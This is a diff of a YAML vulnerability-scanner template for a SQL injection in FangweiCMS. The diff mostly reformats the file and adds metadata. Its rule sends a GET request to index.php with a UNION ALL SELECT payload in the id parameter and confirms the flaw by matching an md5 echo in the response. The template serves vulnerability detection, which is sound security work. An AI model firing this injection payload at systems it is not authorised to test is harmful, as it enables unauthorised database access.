@@ -1,17 +1,19 @@
 id: fangweicms-sqli
 
 info:
-    name: FangweiCMS sqli
-    author: Rexus
-    severity: high
+  name: FangweiCMS sqli
+  author: Rexus
+  severity: high
+  verified: true
+  tags: fangweicms,sqli
+  created: 2023/11/14
 
 set:
-    rand: randomInt(200000000, 210000000)
+  rand: randomInt(200000000, 210000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5({{rand}})%29%23
-        expression: response.body.bcontains(bytes(md5(string(rand))))
+  r0:
+    request:
+      method: GET
+      path: /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5({{rand}})%29%23
+    expression: response.body.bcontains(bytes(md5(string(rand))))
 expression: r0()
-
